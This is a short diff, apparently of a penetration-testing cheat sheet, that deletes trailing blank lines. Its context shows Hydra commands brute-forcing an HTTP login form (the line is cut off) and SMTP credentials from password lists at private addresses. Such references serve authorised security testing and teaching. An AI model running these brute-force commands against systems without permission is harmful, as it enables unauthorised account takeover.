@@ -50,11 +50,3 @@ hydra -l admin -P rockyou.txt 192.168.1.10 http-post-form "/login.php:username=^
 ```ruby
 hydra -L users.txt -P passwords.txt smtp://10.0.0.1 -o smtp_results.txt
 ```
-
-
-
-
-
-
-
-
